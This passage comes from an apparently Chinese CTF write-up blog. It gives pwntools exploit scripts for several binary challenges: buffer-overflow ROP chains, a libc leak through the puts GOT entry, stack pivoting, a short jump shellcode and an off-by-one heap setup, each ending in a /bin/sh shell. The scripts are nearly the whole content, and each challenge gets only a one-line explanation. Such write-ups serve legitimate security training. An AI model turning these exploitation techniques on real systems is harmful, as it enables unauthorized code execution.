punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">47708</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400823</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040056e</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x114514</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400757</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="shortshell"><a href="#shortshell" class="headerlink" title="shortshell"></a>shortshell</h3><p><code>rbx</code>里有地址，直接计算一下<code>jmp</code>过去</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">27490</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''sub bl, 0x18jmp rbx'''</span>p <span class="token operator">=</span> <span class="token string">b'\x80\xeb\x1c\xff\xe3'</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>控制<code>main</code>和<code>gift</code>的<code>rbp</code>，利用<code>gift</code>读的长度大向<code>main</code>的<code>ret</code>写</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">37134</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>stack_check_fail <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013e3</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'functions?'</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_check_fail <span class="token operator">+</span> <span class="token number">0xa00</span> <span class="token operator">-</span> <span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401296</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'functions?'</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_check_fail <span class="token operator">+</span> <span class="token number">0xa00</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401258</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401296</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'functions?'</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x404a28</span> <span class="token operator">+</span> <span class="token number">0x48</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401258</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basebin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="magicread"><a href="#magicread" class="headerlink" title="magicread"></a>magicread</h3><p>栈迁移</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">40862</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>bss <span class="token operator">=</span> <span class="token number">0x601a00</span>read <span class="token operator">=</span> <span class="token number">0x400675</span>start <span class="token operator">=</span> <span class="token number">0x400510</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400723</span>leave_ret <span class="token operator">=</span> <span class="token number">0x0000000000400691</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23_11.3/libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>bin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="round3"><a href="#round3" class="headerlink" title="round3"></a>round3</h2><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>直接<code>nc</code>连接输入<code>SuperSecretPassword</code></p><h3 id="ezstack3"><a href="#ezstack3" class="headerlink" title="ezstack3"></a>ezstack3</h3><p>栈迁移</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">32404</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'stack3'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shell <span class="token operator">=</span> <span class="token number">0x8049347</span>addr <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x40</span>bin_sh <span class="token operator">=</span> addr <span class="token operator">+</span> <span class="token number">0x28</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08049185</span>p <span class="token operator">=</span> p32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>shell<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'pwn'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="null"><a href="#null" class="headerlink" title="null"></a>null</h3><p><code>off-by-one</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">37786</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token 